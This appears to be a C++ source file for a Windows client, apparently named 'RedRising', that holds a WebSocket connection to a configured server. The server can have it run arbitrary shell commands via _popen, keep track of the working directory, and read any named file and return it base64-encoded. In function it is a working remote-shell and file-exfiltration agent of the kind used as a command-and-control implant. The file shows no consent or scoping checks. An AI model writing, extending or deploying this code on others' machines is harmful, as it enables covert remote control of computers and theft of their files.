#include "terminal.h"
#include "commands.h"
#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <mutex>
#include <cstring>

#pragma comment(lib, "winhttp.lib")

// WinHTTP WebSocket constants/functions may not be in older MinGW headers
#ifndef WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET
#define WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET 99
#endif

#ifndef WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE
#define WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE 2
#endif

#ifndef WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE
#define WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE 3
#endif

#ifndef WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS
#define WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS 1000
#endif

// Dynamically load WebSocket functions since they may not be in all MinGW libs
typedef HINTERNET (WINAPI *WinHttpWebSocketCompleteUpgradeFunc)(HINTERNET, DWORD_PTR);
typedef HRESULT (WINAPI *WinHttpWebSocketSendFunc)(HINTERNET, DWORD, PVOID, DWORD, DWORD*);
typedef HRESULT (WINAPI *WinHttpWebSocketReceiveFunc)(HINTERNET, PVOID, DWORD, DWORD*, DWORD*);
typedef HRESULT (WINAPI *WinHttpWebSocketCloseFunc)(HINTERNET, USHORT, PVOID, DWORD);

static WinHttpWebSocketCompleteUpgradeFunc pWinHttpWebSocketCompleteUpgrade = nullptr;
static WinHttpWebSocketSendFunc pWinHttpWebSocketSend = nullptr;
static WinHttpWebSocketReceiveFunc pWinHttpWebSocketReceive = nullptr;
static WinHttpWebSocketCloseFunc pWinHttpWebSocketClose = nullptr;

static bool loadWSFunctions() {
    if (pWinHttpWebSocketCompleteUpgrade) return true;
    HMODULE hMod = GetModuleHandleW(L"winhttp.dll");
    if (!hMod) hMod = LoadLibraryW(L"winhttp.dll");
    if (!hMod) return false;
    pWinHttpWebSocketCompleteUpgrade = (WinHttpWebSocketCompleteUpgradeFunc)GetProcAddress(hMod, "WinHttpWebSocketCompleteUpgrade");
    pWinHttpWebSocketSend = (WinHttpWebSocketSendFunc)GetProcAddress(hMod, "WinHttpWebSocketSend");
    pWinHttpWebSocketReceive = (WinHttpWebSocketReceiveFunc)GetProcAddress(hMod, "WinHttpWebSocketReceive");
    pWinHttpWebSocketClose = (WinHttpWebSocketCloseFunc)GetProcAddress(hMod, "WinHttpWebSocketClose");
    return pWinHttpWebSocketCompleteUpgrade && pWinHttpWebSocketSend && pWinHttpWebSocketReceive && pWinHttpWebSocketClose;
}

static std::string gTermCwd;
static std::mutex gTermWSMutex;
static std::atomic<bool> gTermWSActive{false};
static HINTERNET gTermWSHandle{nullptr};  // WebSocket handle after upgrade
static std::thread gTermWSThread;

static std::string base64EncodeStr(const std::string& input) {
    static const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(b64chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(b64chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

static std::string base64EncodeVec(const std::vector<unsigned char>& data) {
    static const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : data) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(b64chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(b64chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

static std::string basenameOf(const std::string& path) {
    size_t pos = path.find_last_of("\\/");
    return (pos == std::string::npos) ? path : path.substr(pos + 1);
}

static std::wstring s2w(const std::string& s) {
    return std::wstring(s.begin(), s.end());
}

static std::pair<std::string, int> execCommand(const std::string& cmd) {
    std::string output;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return {"", -1};
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        output += buffer;
    }
    int exitCode = _pclose(pipe);
    return {output, exitCode};
}

static std::string extractJsonString(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + search.size());
    if (pos == std::string::npos) return "";
    pos++;
    while (pos < json.size() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
    if (pos >= json.size() || json[pos] != '"') return "";
    pos++;
    std::string result;
    while (pos < json.size() && json[pos] != '"') {
        if (json[pos] == '\\' && pos + 1 < json.size()) {
            pos++;
            switch (json[pos]) {
                case 'n': result += '\n'; break;
                case 'r': result += '\r'; break;
                case 't': result += '\t'; break;
                case '\\': result += '\\'; break;
                case '"': result += '"'; break;
                default: result += json[pos]; break;
            }
        } else {
            result += json[pos];
        }
        pos++;
    }
    return result;
}

static bool wsSend(HINTERNET hWS, const std::string& data) {
    if (!pWinHttpWebSocketSend) return false;
    DWORD bytesWritten = 0;
    HRESULT hr = pWinHttpWebSocketSend(hWS, WINHTTP_WEB_SOCKET_UTF8_MESSAGE_BUFFER_TYPE,
        (PVOID)data.c_str(), (DWORD)data.size(), &bytesWritten);
    return SUCCEEDED(hr);
}

static void terminalWSLoop(const Config cfg) {
    URL_COMPONENTS urlComp{};
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    std::string serverURL = cfg.serverURL;
    bool isHttps = false;
    if (serverURL.find("https://") == 0) {
        isHttps = true;
        serverURL = "https://" + serverURL.substr(8);
    } else if (serverURL.find("http://") == 0) {
        serverURL = "http://" + serverURL.substr(7);
    }

    std::wstring wURL = s2w(serverURL);
    if (!WinHttpCrackUrl(wURL.c_str(), (DWORD)wURL.length(), 0, &urlComp)) {
        std::cerr << "terminal ws: failed to parse URL" << std::endl;
        gTermWSActive = false;
        return;
    }

    std::wstring host(urlComp.lpszHostName, urlComp.dwHostNameLength);
    std::wstring path = L"/api/ws";

    HINTERNET hSession = WinHttpOpen(L"RedRising/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        std::cerr << "terminal ws: WinHttpOpen failed" << std::endl;
        gTermWSActive = false;
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), urlComp.nPort, 0);
    if (!hConnect) {
        std::cerr << "terminal ws: WinHttpConnect failed" << std::endl;
        WinHttpCloseHandle(hSession);
        gTermWSActive = false;
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path.c_str(), NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        isHttps ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        std::cerr << "terminal ws: WinHttpOpenRequest failed" << std::endl;
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        gTermWSActive = false;
        return;
    }

    // Load WebSocket functions
    if (!loadWSFunctions()) {
        std::cerr << "terminal ws: WebSocket functions not available (requires Windows 8+)" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        gTermWSActive = false;
        return;
    }

    // Set up WebSocket upgrade
    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0)) {
        std::cerr << "terminal ws: failed to set WebSocket upgrade option" << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        gTermWSActive = false;
        return;
    }

    // Add Basic Auth header
    std::string authHeader = "Authorization: Basic " + base64EncodeStr(cfg.clientID + ":" + cfg.token);
    std::wstring wAuth = s2w(authHeader);
    WinHttpAddRequestHeaders(hRequest, wAuth.c_str(), (ULONG)wAuth.length(), WINHTTP_ADDREQ_FLAG_ADD);

    // Send the HTTP request to initiate WebSocket upgrade
    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0);
    if (!bResults) {
        std::cerr << "terminal ws: WinHttpSendRequest failed: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        gTermWSActive = false;
        return;
    }

    // Receive the server response (101 Switching Protocols)
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        std::cerr << "terminal ws: WinHttpReceiveResponse failed: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        gTermWSActive = false;
        return;
    }

    // Complete the WebSocket upgrade
    HINTERNET hWebSocket = pWinHttpWebSocketCompleteUpgrade(hRequest, NULL);
    if (!hWebSocket) {
        std::cerr << "terminal ws: WebSocket upgrade failed: " << GetLastError() << std::endl;
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        gTermWSActive = false;
        return;
    }

    // The original request handle is no longer needed after upgrade
    WinHttpCloseHandle(hRequest);
    // hConnect and hSession can also be closed; the WebSocket handle is standalone
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    // Store WebSocket handle for stopTerminalWS
    {
        std::lock_guard<std::mutex> lock(gTermWSMutex);
        gTermWSHandle = hWebSocket;
    }

    std::cout << "terminal ws: connected" << std::endl;

    // Read loop
    DWORD bytesRead = 0;
    DWORD bufType = 0;
    std::vector<char> recvBuf(65536);

    while (gTermWSActive) {
        HRESULT hr = pWinHttpWebSocketReceive(hWebSocket, recvBuf.data(), (DWORD)recvBuf.size(), &bytesRead, &bufType);
        if (FAILED(hr) || bytesRead == 0) {
            std::cerr << "terminal ws: receive failed or closed" << std::endl;
            break;
        }

        std::string message(recvBuf.data(), bytesRead);

        // Parse the message type
        std::string msgType = extractJsonString(message, "type");
        std::string msgData;
        {
            // Extract "data" field as raw JSON substring
            std::string dataKey = "\"data\"";
            size_t dataPos = message.find(dataKey);
            if (dataPos != std::string::npos) {
                size_t colonPos = message.find(':', dataPos + dataKey.size());
                if (colonPos != std::string::npos) {
                    size_t valueStart = colonPos + 1;
                    while (valueStart < message.size() && (message[valueStart] == ' ' || message[valueStart] == '\t'))
                        valueStart++;
                    if (valueStart < message.size() && message[valueStart] == '{') {
                        // Find matching close brace
                        int depth = 0;
                        size_t i = valueStart;
                        for (; i < message.size(); ++i) {
                            if (message[i] == '{') depth++;
                            else if (message[i] == '}') {
                                depth--;
                                if (depth == 0) { i++; break; }
                            }
                        }
                        msgData = message.substr(valueStart, i - valueStart);
                    } else if (valueStart < message.size() && message[valueStart] == '"') {
                        // String value
                        size_t end = valueStart + 1;
                        while (end < message.size() && message[end] != '"') {
                            if (message[end] == '\\' && end + 1 < message.size()) end += 2;
                            else end++;
                        }
                        msgData = message.substr(valueStart, end - valueStart + 1);
                    }
                }
            }
        }

        if (msgType.find("command") != std::string::npos) {
            std::string cmdId = extractJsonString(message, "id");
            std::string cmdType = extractJsonString(message, "type");
            if (cmdId.empty()) continue;

            // If the data field has more specific info, use it
            if (!msgData.empty()) {
                std::string dataType = extractJsonString(msgData, "type");
                if (!dataType.empty()) cmdType = dataType;
                std::string dataId = extractJsonString(msgData, "id");
                if (!dataId.empty()) cmdId = dataId;
            }

            // Ack via WS
            std::string ack = "{\"type\":\"command_ack\",\"data\":{\"command_id\":\"" + escapeJson(cmdId) + "\"}}";
            wsSend(hWebSocket, ack);

            // Execute command
            std::string result;
            std::string error;
            bool resultIsRawJson = false;

            if (cmdType == "exec") {
                std::string cmdStr = extractJsonString(message, "command");
                if (msgData.length() > 10) {
                    std::string dataCmd = extractJsonString(msgData, "command");
                    if (!dataCmd.empty()) cmdStr = dataCmd;
                }
                // Wrap with cwd prefix and append cwd marker
                std::string wrappedCmd;
                if (!gTermCwd.empty()) {
                    wrappedCmd = "cd /d \"" + gTermCwd + "\" && " + cmdStr;
                } else {
                    wrappedCmd = cmdStr;
                }
                wrappedCmd = wrappedCmd + " & echo __CWD__:%cd%";
                auto [output, exitCode] = execCommand(wrappedCmd);
                // Extract CWD marker from output
                std::string marker = "__CWD__:";
                std::string newCwd;
                size_t markerPos = output.rfind(marker);
                if (markerPos != std::string::npos) {
                    newCwd = output.substr(markerPos + marker.size());
                    // Trim trailing newline/whitespace
                    while (!newCwd.empty() && (newCwd.back() == '\n' || newCwd.back() == '\r' || newCwd.back() == ' '))
                        newCwd.pop_back();
                    output = output.substr(0, markerPos);
                    // Trim trailing newline
                    while (!output.empty() && (output.back() == '\n' || output.back() == '\r'))
                        output.pop_back();
                    if (!newCwd.empty()) gTermCwd = newCwd;
                }
                // Result is a JSON object with output and cwd
                std::ostringstream cmdOss;
                cmdOss << "{\"output\":\"" << escapeJson(output) << "\",\"cwd\":\"" << escapeJson(gTermCwd) << "\"}";
                result = cmdOss.str();
                resultIsRawJson = true;
                if (exitCode != 0) {
                    error = "exit code " + std::to_string(exitCode);
                }
            } else if (cmdType == "download") {
                std::string filePath = extractJsonString(message, "path");
                if (msgData.length() > 10) {
                    std::string dataPath = extractJsonString(msgData, "path");
                    if (!dataPath.empty()) filePath = dataPath;
                }
                if (filePath.empty()) {
                    error = "missing path payload";
                } else {
                    std::ifstream file(filePath, std::ios::binary);
                    if (!file) {
                        error = "cannot read file: " + filePath;
                    } else {
                        std::vector<unsigned char> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                        std::string b64 = base64EncodeVec(data);
                        std::ostringstream oss;
                        oss << "{\"name\":\"" << escapeJson(basenameOf(filePath)) << "\","
                            << "\"content\":\"" << b64 << "\","
                            << "\"size\":\"" << data.size() << "\"}";
                        result = oss.str();
                        resultIsRawJson = true;
                    }
                }
            } else if (cmdType == "sync") {
                result = "sync triggered";
            } else {
                error = "unsupported command type: " + cmdType;
            }

            // Send result via WS
            std::ostringstream resOss;
            resOss << "{\"type\":\"command_result\",\"data\":{\"command_id\":\"" << escapeJson(cmdId) << "\"";
            if (!error.empty()) {
                resOss << ",\"error\":\"" << escapeJson(error) << "\"";
            }
            if (!result.empty()) {
                if (resultIsRawJson) {
                    resOss << ",\"result\":" << result;
                } else {
                    resOss << ",\"result\":\"" << escapeJson(result) << "\"";
                }
            }
            resOss << "}}";
            wsSend(hWebSocket, resOss.str());
        }
    }

    // Cleanup
    {
        std::lock_guard<std::mutex> lock(gTermWSMutex);
        gTermWSHandle = nullptr;
    }
    if (pWinHttpWebSocketClose) {
        pWinHttpWebSocketClose(hWebSocket, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
    }
    WinHttpCloseHandle(hWebSocket);

    std::cout << "terminal ws: disconnected" << std::endl;
    gTermWSActive = false;
}

void startTerminalWS(const Config& cfg) {
    stopTerminalWS();
    gTermCwd = "";
    gTermWSActive = true;
    gTermWSThread = std::thread(terminalWSLoop, cfg);
    gTermWSThread.detach();
}

void stopTerminalWS() {
    if (!gTermWSActive) return;
    gTermWSActive = false;
    std::lock_guard<std::mutex> lock(gTermWSMutex);
    if (gTermWSHandle && pWinHttpWebSocketClose) {
        pWinHttpWebSocketClose(gTermWSHandle, WINHTTP_WEB_SOCKET_SUCCESS_CLOSE_STATUS, NULL, 0);
    }
}

bool isTerminalWSActive() {
    return gTermWSActive;
}